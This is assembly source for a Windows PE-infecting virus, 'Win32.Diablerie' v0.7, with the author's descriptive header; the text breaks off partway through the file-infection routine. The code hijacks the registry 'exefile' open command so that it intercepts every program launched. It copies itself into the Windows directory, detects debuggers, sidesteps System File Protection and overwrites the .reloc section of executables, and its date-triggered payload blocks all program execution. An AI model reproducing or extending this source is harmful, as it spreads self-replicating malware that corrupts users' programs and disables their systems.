comment $

                          ษฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤป
                          ณ Win32.Diablerie รฤป
                          ศฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤผ ณ
                            ศฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤผ

       Version:  0.7
        Author:  Dr. Watcom <drwatcom@jazzfree.com> (Valencia / SPAIN)
      Compiler:  Borland Turbo Assembler (version 5.0r / 32bit)
          Type:  PE-Infector (relocations overwriter)
      Platform:  Intel 80386 processor and compatibles
       Systems:  Win95, Win98, WinME, WinNT, Win2K
          Size:  2848 bytes
   Sys Hooking:  Changes 'exefile' registry key to trap EXE files execution
    Encryption:  Not implemented (may be next version...)
           EPO:  Virus code is run from a loader within DOS stub, using SEH
       Anti-AV:  Not implemented.
     Anti-Bait:  Does not infect tiny files (with relocations < virus)
    Anti-Debug:  Detects app-level debuggers, tries to kill them with SEH
       Payload:  On 01/11 denies all program execution, shows credits


        .Comments.

        This is my second virus and it's a bit lame yet, as it has no
      polymorphic engine and even uses no encryption,  but I think it
      implements a couple of nifty things: it obscures the entrypoint
      by clearing it in the header,  so the victims get executed from
      the very beggining of the file (including the 'MZ' signature!!)
      and then jmp to a loader located in the DOS stub code, which is
      redone to keep compatibility  (so running victims under  MS-DOS
      gives no error).  This loader passes control to the virus using
      a SEH frame to jmp.
  
        The virus changes the  'HKCR\exefile\shell\open\command'  key
      to trap any program which gets executed, and then infects it by
      overwriting .reloc section. It also detects (and tries to kill)
      application-level debuggers.
  
        The payload is very lame: only a lil' message box showing the
      credits and denying all program execution on 01/11. The payload
      text  (as the virus name)  was inspired by the roleplaying game
      "Vampire: The Masquerade"  (of course, the *real* game, not the
      computer one!!)


        .Compilation.

      (Why would anybody want to compile this?)

      tasm32 /m /ml diablerie.asm
      tlink32 /Tpe /aa /c diablerie.obj, diablerie.exe,, import32.lib
      pewrite diablerie.exe

$


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Preprocessor                                                             บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
.386                                   ; Instruction set to be used
.model flat                            ; No segmentation!

include win32.inc                      ; Windows structures and constants
include mz_pe.inc                      ; DOS (MZ) & Win32 (PE) exe layout

extrn ExitProcess           :PROC      ; Some APIs used by fake host code
extrn MessageBoxA           :PROC      ; 
extrn _wsprintfA            :PROC      ;


;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ Useful equates and macros รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
DEBUG             equ  TRUE            ; TRUE -> Do not infect files
CRLF              equ  <13,10>
SPAWN_NAME        equ  <'msdiab.exe'>
VIRUS_NAME        equ  <'Win32.Diablerie'>
VIRUS_VERSION     equ  <'v0.7'>
VIRUS_SIZE        equ  End - Start
OPCODE_JMP_SHORT  equ  0ebh
PAYLOAD_MONTH     equ  11
PAYLOAD_DAY       equ  1

KERNEL32_WIN9X     equ     0bff70000h  ; Hardcoded values, in case we don't
KERNEL32_WINNT     equ     077f00000h  ; find Kernel32 by other ways. Those
KERNEL32_WIN2K     equ     077e00000h  ; values are then checked using SEH
KERNEL32_WINME     equ     0bff60000h  ; before using them, to avoid PF's


api MACRO name
    call [ebp + name]
ENDM

PUT_SEH_HANDLER  MACRO  label
    local @@skip_handler
    call  @@skip_handler
    mov   esp, [esp + 08h]
    jmp   label
  @@skip_handler:
    xor   edx, edx
    push  dword ptr fs:[edx]
    mov   dword ptr fs:[edx], esp
ENDM

RESTORE_SEH_HANDLER  MACRO
    xor   edx, edx
    pop   dword ptr fs:[edx]
    pop   edx
ENDM

GENERATE_EXCEPTION  MACRO
    xor   edx, edx
    div   edx
ENDM

STRLEN MACRO
    push  eax
    push  esi
    push  edi
    mov   edi, esi
    xor   ecx, ecx
    dec   ecx
    xor   eax, eax
    repne scasb
    mov   ecx, edi
    sub   ecx, esi
    pop   edi
    pop   esi
    pop   eax
ENDM
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Host data                                                                บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
; This data is used only by first-generation fake host code
.data
szTitle     db  VIRUS_NAME, 0
szTemplate  db  'Virus ',VIRUS_NAME,' ',VIRUS_VERSION,' ','has been activated.', CRLF
            db  'Current virus size is %i bytes (0x%X bytes).', CRLF, CRLF
            db  'Have a nice day.', 0
szBait      db  'bait1.exe', 0
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Virus code                                                               บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
.code
Start:

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ Setup everything รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
    call GetDelta                      ; Trivial stuff, don't you think?
  GetDelta:                            ; Ok, I'll explain: this way you can
    pop  ebp                           ; get the code displacement (a.k.a.
    sub  ebp, offset GetDelta          ; delta offset)
    test ebp, ebp
    jz   FirstGenEntry

    mov   esp, [esp + 08h]
    RESTORE_SEH_HANDLER

    mov  eax, [ebp + File_EntryPoint]  ; Original EP (saved during infection)
    mov  [ebp + HostEntry], eax        ; Store it in a safe place

  FirstGenEntry:
    cld                                ; We don't like surprises...

    mov  esi, [esp]                    ; To find Kernel32 we will use the
    call FindKernel32                  ; ret address in the stack, wich
    jc   ReturnToHost                  ; (hopefully) will point into it

    call LocateAPIs
    jc   ReturnToHost

    push size PROCESS_INFORMATION      ;
    push GMEM_FIXED or GMEM_ZEROINIT   ;
    api  GlobalAlloc                   ;
    mov  [ebp + ProcessInfo], eax      ;

    push size STARTUPINFO              ;
    push GMEM_FIXED or GMEM_ZEROINIT   ;
    api  GlobalAlloc                   ;
    mov  [ebp + StartupInfo], eax      ;

    mov  [eax.SI_Size], size STARTUPINFO
    push eax
    api  GetStartupInfo                ; Get our startup information

    test ebp, ebp
    jz   FakeHost

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ Hands on!!! รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤู
    call RNG_Init                      ; Init the Random Number Generator

    call DetectDebuggers
    jc   ReturnToHost

    call ParseCommandLine
    jnc  ExecutedFromReg

    call SetupRegHook
    jmp  ReturnToHost

  ExecutedFromReg:
    mov  esi, [ebp + CmdExefile]
IF DEBUG
    push 1040h
    lea  edx, [ebp + szVirusName]
    push edx
    push esi
    push NULL
    api  MessageBox
ELSE
    call InfectFile
ENDIF

    sub  esp, size SYSTEMTIME
    mov  esi, esp
    push esi
    api  GetSystemTime
    add  esp, size SYSTEMTIME

    cmp  [esi.ST_Month], PAYLOAD_MONTH
    jne  ExecuteVictim
    cmp  [esi.ST_Day], PAYLOAD_DAY
    jne  ExecuteVictim

    push 1040h
    lea  edx, [ebp + szVirusName]
    push edx
    lea  edx, [ebp + szVirusCredits]
    push edx
    push NULL
    api  MessageBox

IF DEBUG
ELSE
    jmp  ExitToWindows
ENDIF

  ExecuteVictim:
    mov  esi, [ebp + CmdSpawn]         ;
    mov  ebx, [ebp + ProcessInfo]      ; must execute our command line
    mov  edx, [ebp + StartupInfo]      ; as a new process
    xor  eax, eax

    push ebx
    push edx
    push eax
    push eax
    push eax
    push eax
    push eax
    push eax
    push esi
    push eax
    api  CreateProcess

  ExitToWindows:
    push 0
    api  ExitProcess_

  ReturnToHost:
    test ebp, ebp
    jz   FakeHost_Quit
    push [ebp + HostEntry]
    ret
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Virus Subroutines                                                        บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
; DetectDebuggers
; FindKernel32
; LocateAPIs
; ParseCommandLine
; SetupRegHook

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ DetectDebuggers รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Detects application-level debuggers and tries to kill them with SEH
;
; Output:
;   carry flag -> set if debugger persists, clear if not

DetectDebuggers:
    pushad

    PUT_SEH_HANDLER FD_Continue        ; Use SEH to kill debuggers
    xor   eax, eax                     ; Generate a exception (divide by 0)
    div   eax                          ;
    RESTORE_SEH_HANDLER                ; Here some abnormal occured
    jmp   FD_Debugger_Found            ; So lets quit
  FD_Continue:                         ; Execution should resume at this pnt
    RESTORE_SEH_HANDLER                ; Remove handler

    mov   eax, fs:[20h]                ; Detect application-level debugger
    test  eax, eax                     ; Is present?
    jnz   FD_Debugger_Found            ; Quit!

    popad                              ; No debuggers found, so restore
    clc                                ; registers, clear carry flag and
    ret                                ; return!

  FD_Debugger_Found:
    popad
    stc
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ FindKernel32 รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Tries to find Kernel32 base address by scanning back from a certain address
; and, if that fails, by using some hardcoded values
;
; Input:
;   esi -> must point somewhere into kernel32
; Output:
;   var Kernel32 -> will point to Kernel32 base address
;   carry flag   -> set on error

FindKernel32:
    pushad

    and  esi, 0FFFF0000h
    mov  ecx, 100h

  FK32_Loop:
    call TryAddress
    jnc  FK32_Success
    sub  esi, 010000h
    loop FK32_Loop

  FK32_Hardcodes:
    mov  esi, KERNEL32_WIN9X
    call TryAddress
    jnc  FK32_Success

    mov  esi, KERNEL32_WINNT
    call TryAddress
    jnc  FK32_Success

    mov  esi, KERNEL32_WIN2K
    call TryAddress
    jnc  FK32_Success

    mov  esi, KERNEL32_WINME
    call TryAddress
    jnc  FK32_Success

  FK32_Fail:
    popad
    stc
    ret

  FK32_Success:
    mov [ebp + Kernel32], esi
    popad
    clc
    ret
;ฺฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ LocateAPIs รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤู
; Gets all API addresses that our virus needs
;
; Output:
;   carry flag -> set on error, clear on success

LocateAPIs:
    pushad

    mov  ebx, [ebp + Kernel32]         ; Having found Kernel32, we will get
    lea  esi, [ebp + Kernel_API_CRC32] ; an array of API addresses by their
    lea  edi, [ebp + Kernel_API_Addr]  ; names CRC32, scanning the Kernel32
    call GetAPIArray                   ; export table
    jc   LA_Fail                       ;

    lea  edx, [ebp + szUser32]         ; More API's! This time we call
    push edx                           ; LoadLibrary to get User32
    api  LoadLibrary                   ; Call API
    mov  ebx, eax                      ; ebx -> Module handle
    lea  esi, [ebp + User_API_CRC32]   ; esi -> Pointer to CRC32 table
    lea  edi, [ebp + User_API_Addr]    ; edi -> Where to store addresses
    call GetAPIArray                   ; Call our procedure
    jc   LA_Fail                       ; Any problem? If so, bail out

    lea  edx, [ebp + szAdvapi32]       ; More API's!
    push edx                           ;
    api  LoadLibrary                   ;
    mov  ebx, eax                      ;
    lea  esi, [ebp + Advapi_API_CRC32] ;
    lea  edi, [ebp + Advapi_API_Addr]  ;
    call GetAPIArray                   ;
    jc   LA_Fail                       ; Any problem? If so, bail out

  LA_Success:
    popad
    clc
    ret

  LA_Fail:
    popad
    stc
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ ParseCommandLine รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Parses our commandline and checks for special params
;
; Output:
;   var CmdLine
;   var CmdSpawn
;   var CmdExefile
;   carry flag -> set if no special param found, clear otherwise

ParseCommandLine:
    pushad

    xor    eax, eax
    mov    [ebp + CmdSpawn], eax
    mov    [ebp + CmdExefile], eax
    api    GetCommandLine                ; Get our command line
    mov    [ebp + CmdLine], eax          ; Save it

    mov    esi, eax                      ;
    call   GetNextParam                  ;
    jc     PCL_Quit                      ;

    lodsb
    dec    al
    jnz    PCL_Quit
    mov    [ebp + CmdSpawn], esi

    STRLEN
    push   ecx
    push   GMEM_FIXED
    api    GlobalAlloc
    mov    [ebp + CmdExefile], eax

    mov    edi, eax
    STRLEN
    rep    movsb

    mov    esi, [ebp + CmdExefile]
    call   GetNextParam
    jc     PCL_Quit

    dec    esi
    mov    byte ptr [esi], 0

    popad
    clc
    ret

  PCL_Quit:
    popad
    stc
    ret


;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ SetupRegHook รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Copies our host to Windows directory and changes the 'exefile' key in reg

SetupRegHook:
    pushad

    sub  esp, MAX_PATH
    mov  esi, esp
    sub  esp, MAX_PATH
    mov  edi, esp

    push MAX_PATH
    push edi
    api  GetWindowsDirectory

    lea  edx, [ebp + szSpawnFile]
    push edx
    push edi
    api  lstrcat

    push MAX_PATH
    push esi
    push NULL
    api  GetModuleFileName

    push FALSE
    push edi
    push esi
    api  CopyFile

    lea  esi, [ebp + szRegValue]
    lea  edi, [ebp + szRegKey]
    mov  edx, HKEY_CLASSES_ROOT
    call ChangeRegString

    add  esp, MAX_PATH + MAX_PATH
    popad
    ret


;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Virus Functions                                                          บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
; ChangeRegString
; GetAPIAddress
; GetAPIArray
; GetCRC32
; GetNextParam
; TryAddress

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ ChangeRegString รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Shortcut to change a registry string
;
; Input:
;   edi -> pointer to key to be changed
;   esi -> pointer to key value
;   edx -> hotkey

ChangeRegString:
    pushad

    sub  esp, 4
    mov  ebx, esp

    push ebx
    push KEY_ALL_ACCESS
    push 0
    push edi
    push edx
    api  RegOpenKeyEx

    STRLEN
    dec  ecx
    push ecx
    push esi
    push REG_SZ
    push NULL
    push dword ptr [ebx]
    api  RegSetValue

    push dword ptr [ebx]
    api  RegCloseKey

    add  esp, 4
    popad
    ret


;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ GetAPIAddress รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Tries to get an API address by its CRC32 from the given module export table
;
; Input:
;   esi -> module handle
;   edx -> API's CRC32
; Output:
;   eax -> API's address
;   carry flag -> set on error, clear on success

GetAPIAddress:
    pushad

    mov  edi, esi
    add  esi, [edi.MZ_lfanew]
    add  esi, 078h
    lodsd
    add  eax, edi
    mov  esi, eax

    mov  eax, [esi.ED_NumberOfNames]
    mov  [ebp + ET_MaxNames], eax

    mov  eax, [esi.ED_AddressOfNames]
    add  eax, edi
    mov  [ebp + ET_PtrNames], eax

    mov  eax, [esi.ED_AddressOfFunctions]
    add  eax, edi
    mov  [ebp + ET_PtrAddresses], eax

    mov  eax, [esi.ED_AddressOfNameOrdinals]
    add  eax, edi
    mov  [ebp + ET_PtrOrdinals], eax

    mov  esi, [ebp + ET_PtrNames]
    mov  ecx, [ebp + ET_MaxNames]
    xor  eax, eax
    mov  [ebp + Count], eax

  GA_GetNamePtr:
    jecxz GA_Fail
    lodsd
    push esi
    add  eax, edi
    mov  esi, eax
    xor  ebx, ebx

    push ecx
    STRLEN
    call GetCRC32
    pop  ecx
    cmp  eax, edx
    jne  GA_Next

    mov  ecx, [ebp + Count]

    mov  esi, [ebp + ET_PtrOrdinals]
    shl  ecx, 1
    add  esi, ecx
    xor  eax, eax
    lodsw
    mov  esi, [ebp + ET_PtrAddresses]
    shl  eax, 2
    add  esi, eax
    lodsd
    add  eax, edi
    mov [ebp + ET_TmpAddress], eax
    jmp GA_Success

  GA_Next:
    pop  esi
    dec  ecx
    inc  [ebp + Count]
    jmp  GA_GetNamePtr

  GA_Success:
    pop  esi
    popad
    mov  eax, [ebp + ET_TmpAddress]
    clc
    ret

  GA_Fail:
    popad
    stc
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ GetAPIArray รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Gets an array of API addresses from the given module
;
; Input:
;   esi -> points to an array of CRC32 values, ending with a NULL dword
;   edi -> points to destination of the address array
;   ebx -> module handle
; Output:
;   carry flag -> set on error, clear on success

GetAPIArray:

    pushad

  GAA_Loop:
    lodsd
    test eax, eax
    jz   GAA_Success
    mov  edx, eax
    push esi
    mov  esi, ebx
    call GetAPIAddress
    jc   GAA_Fail
    stosd
    pop  esi
    jmp  GAA_Loop

  GAA_Success:
    popad
    clc
    ret

  GAA_Fail:
    popad
    stc
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฟ
;ณ GetCRC32 รฤฟ
;ภฤยฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤู
; Computes CRC32 checksum of the given data
;
; Input:
;   esi -> pointer to data
;   ecx -> size of data in bytes
; Output:
;   eax -> CRC32 checksum

GetCRC32:
    pushad

    mov  edi, ecx
    xor  ecx, ecx
    dec  ecx                            
    mov  edx, ecx

  CRC32_NextByte:
    xor  eax, eax
    xor  ebx, ebx
    lodsb
    xor  al, cl
    mov  cl, ch
    mov  ch, dl
    mov  dl, dh
    mov  dh, 8

  CRC32_NextBit:
    shr  bx, 1
    rcr  ax, 1
    jnc  CRC32_NoCRC
    xor  ax, 08320h
    xor  bx, 0EDB8h

  CRC32_NoCRC:
    dec  dh
    jnz  CRC32_NextBit
    xor  ecx, eax
    xor  edx, ebx
    dec  edi  
    jnz  CRC32_NextByte
    not  edx
    not  ecx
    mov  eax, edx
    rol  eax,16
    mov  ax, cx

    mov  [ebp + CRC32], eax
    popad
    mov  eax, [ebp + CRC32]
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ GetNextParam รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Moves esi pointer to next parameter in a commandline-type string
; Uses SEH to avoid possible protection faults
;
; Input:
;   esi -> pointer to a commandline-type string
;
; Output:
;   esi -> points to next parameter
;   carry flag -> set if string terminated, clear on success

GetNextParam:
    push  eax
    push  ecx

    PUT_SEH_HANDLER GNP_Fail

    mov   cl, 20h                      ; Character to match (space)
  GNP_SkipSpaces:
    lodsb                              ;
    test  al, al                       ;
    jz    GNP_Fail                     ; If al is zero, string was terminated
    cmp   al, cl                       ;
    je    GNP_SkipSpaces               ; There are remaining spaces, loop on

    cmp   al, 22h                      ; First char is a quote?
    jne   GNP_Find                     ; No: we must find a space
    mov   cl, 22h                      ; Yes: we must find the closing quote

  GNP_Find:
    lodsb
    test  al, al
    jz    GNP_Fail
    cmp   al, cl
    jne   GNP_Find

    RESTORE_SEH_HANDLER
    pop   ecx
    pop   eax
    clc
    ret

  GNP_Fail:
    RESTORE_SEH_HANDLER
    pop   ecx
    pop   eax
    stc
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ TryAddress รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤู
; Checks if esi points to a valid PE base address (useful to find Kernel32),
; uses SEH to avoid possible faults, so the address may be anything
;
; Input:
;   esi -> address to try
; Output:
;   carry flag -> set on error, clear on success

TryAddress:
    pushad

    PUT_SEH_HANDLER TA_Fail

    cmp word ptr [esi], 'ZM'
    jne TA_Fail
    add esi, [esi.MZ_lfanew]
    cmp word ptr [esi], 'EP'
    je  TA_Success

  TA_Success:
    RESTORE_SEH_HANDLER
    popad
    clc
    ret

  TA_Fail:
    RESTORE_SEH_HANDLER
    popad
    stc
    ret

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Randomizing functions                                                    บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

;ฺฤฤฤฤฤฤฤฤฤฤฟ
;ณ RNG_Init รฤฟ
;ภฤยฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤู
; Initialises the Random Number Generator
;

RNG_Init:
    pushad

    api   GetTickCount
    mov   [ebp + RndSeed_1], eax
    rol   eax, 3
    mov   [ebp + RndSeed_2], eax
    rol   eax, 3
    mov   [ebp + RndSeed_3], eax
    rol   eax, 3
    mov   [ebp + RndSeed_4], eax
    rol   eax, 3
    mov   [ebp + RndSeed_5], eax
    rol   eax, 3
    mov   [ebp + RndSeed_6], eax

    popad
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ RNG_GetRandom รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Returns a 32-bit random number
;
; Output:
;   eax -> random number

RNG_GetRandom:
    push    edx
    mov     eax, [ebp+RndSeed_1]
    mov     edx, [ebp+RndSeed_2]
    xor     eax, [ebp+RndSeed_3]
    xor     edx, [ebp+RndSeed_4]
    shrd    eax, edx, 11h
    push    eax
    mov     eax, [ebp+RndSeed_5]
    mov     edx, [ebp+RndSeed_6]
    and     eax, 0FFFFFFFEh
    add     [ebp+RndSeed_1], eax
    adc     [ebp+RndSeed_2], edx
    inc     dword ptr [ebp+RndSeed_3]
    inc     dword ptr [ebp+RndSeed_4]
    pop     eax
    pop     edx
    ret

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ RNG_GetRandomRange รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; Returns a random number from 0 to [eax - 1]
;
; Input:
;   eax -> maximum random number to get + 1
;
; Output:
;   eax -> random number

RNG_GetRandomRange:
    push ebx
    mov  ebx, eax
    call RNG_GetRandom
  RNG_R_Loop:
    cmp  eax, ebx                      ; Now, keep result in the given range
    jl   RNG_R_Ok                      ; It's in range, so we can return
    shr  eax, 1                        ; It's not. We divide it by 2 and
    jmp  RNG_R_Loop                    ; loop to compare again
  RNG_R_Ok:
    pop  ebx
    ret                                ; Return!

;ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Infection Code                                                           บ
;ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

;ฺฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ณ InfectFile รฤฟ
;ภฤยฤฤฤฤฤฤฤฤฤฤู ณ
;  ภฤฤฤฤฤฤฤฤฤฤฤฤู
; Infects a Portable Executable by overwriting .reloc section
;
; Input:
;   esi -> points to filename to infect
;

InfectFile:
    pushad

    mov   [ebp + FileName], esi
    mov   [ebp + FileInfected], FALSE

    mov   edi, esi
    mov   ecx, MAX_PATH
    xor   eax, eax
    cld
    repnz scasb

    mov   eax, [edi-5]
    or    eax, 20202000h
    cmp   eax, 'exe.'
    jne   IF_Quit

  ; Avoid System File Protection
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    lea  edx, [ebp + szSfc]            ; We have to avoid Win2K/WinME SFP
    push edx                           ; Push a pointer to library name
    api  LoadLibrary                   ; Load it
    test eax, eax                      ; If the library doesn't exist, we
    jz   IF_NotProtected               ; can safely ignore SFP

    lea  edx, [ebp + szSfcProc]        ; Pointer to function name
    push edx                           ; Push it
    push eax                           ; Push module handle
    api  GetProcAddress                ; Call API
    test eax, eax                      ; No function with that name, so we
    jz   IF_NotProtected               ; proceed to infection

    push esi                           ; Pointer to victim's filename
    push NULL                          ; This parameter must be NULL
    call eax                           ; Call SfcIsFileProtected
    test eax, eax                      ; Not protected? Go ahead, continue
    jz   IF_NotProtected               ; with infection
    jmp  IF_Quit                       ; File protected, we must quit

  ; Save file attributes and remove them
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_NotProtected:
    push esi                           ; Points to filename
    api  GetFileAttributes             ; Call API
    mov  [ebp + FileAttribs], eax      ; Save attributes for later use

    push FILE_ATTRIBUTE_NORMAL         ; Now we change the attributes of the
    push esi                           ; file to FILE_ATTRIBUTE_NORMAL
    api  SetFileAttributes             ; Call API


  ; Open a handle to the file
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_OpenFile:
    xor  eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push FILE_SHARE_READ
    push GENERIC_READ or GENERIC_WRITE
    push esi
    api  CreateFile
    inc  eax
    jz   IF_RestoreAttribs
    dec  eax
    mov  [ebp + FileHandle], eax
    
  ; Save creation/access/modify times
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    lea  edx, [ebp + FileTime_Written]
    push edx
    lea  edx, [ebp + FileTime_Accessed]
    push edx
    lea  edx, [ebp + FileTime_Created]
    push edx
    push [ebp + FileHandle]
    api  GetFileTime

  ; Save file size
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    push NULL
    push [ebp + FileHandle]
    api  GetFileSize
    mov  [ebp + FileSize], eax


  ; Open a file mapping object
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CreateMapping:
    xor  eax, eax
    push eax
    push [ebp + FileSize]
    push eax
    push PAGE_READWRITE
    push eax
    push [ebp + FileHandle]
    api  CreateFileMapping
    test eax, eax
    jz   IF_CloseFile
    mov  [ebp + FileMapping], eax


  ; Map a view of the file
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
  IF_CreateView:
    xor  eax, eax
    push dword ptr [ebp + offset FileSize]
    push eax
    push eax
    push FILE_MAP_ALL_ACCESS
    push [ebp + FileMapping]
    api  MapViewOfFile

    test eax, eax
    jz   IF_CloseMapping
    mov  [ebp + FileView], eax
    mov  esi, eax

  ; Check for MZ/PE signatures
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    cmp  word ptr [esi], 'ZM'
    jne  IF_CloseMapping
    add  esi, [esi.MZ_lfanew]
    cmp  word ptr [esi], 'EP'
    jne  IF_CloseMapping

  ; Check for space for the EPO loader
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov  esi, [ebp + FileView]
    mov  edi, esi
    add  esi, [esi.MZ_lfanew]
    sub  esi, edi
    sub  esi, size IMAGE_DOS_HEADER
    cmp  esi, SIZE_EPO_LOADER
    jl   IF_CloseView


  ; Find '.reloc' section
  ;ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov  esi, [ebp + FileView]
    add  esi, [esi.MZ_lfanew]

    movzx eax, word ptr [esi.FH_NumberOfSections]
    mov  [ebp + File_Sections], eax

    add  esi, size IMAGE_FILE_HEADER

    mov  eax, [esi.OH_ImageBase]
    mov  [ebp + File_ImageBase], eax

    mov  eax, [esi.OH_AddressOfEntryPoint]
    add  eax, [ebp + File_ImageBase]
    mov  [ebp + File_EntryPoint], eax

    mov  eax, [esi.OH_NumberOfRvaAndSizes]
    imul ecx, eax, size IMAGE_DATA_DIRECTORY
    add  esi, size IMAGE_OPTIONAL_HEADER
    add  esi, ecx

    mov   eax, [ebp + File_Sections]

  IF_TrySection:
    cmp   dword ptr [esi], 'ler.'
    jne   IF_NextSection
    add   esi, 2
    cmp   dword ptr [esi], 'cole'
    jne   IF_NextSection
    sub   esi, 2
    jmp   IF_FoundRelocs

  IF_NextSection:
    dec   eax
    test  eax, eax
    jz    IF_CloseView
    add   esi, size IMAGE_SECTION_HEADER
    jmp   IF_TrySection

  IF_FoundRelocs:
    cmp   [esi.SH_SizeOfRawData], VIRUS_SIZE
    jl    IF_CloseView

    cmp   [esi.SH_Characteristics], \
      IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE
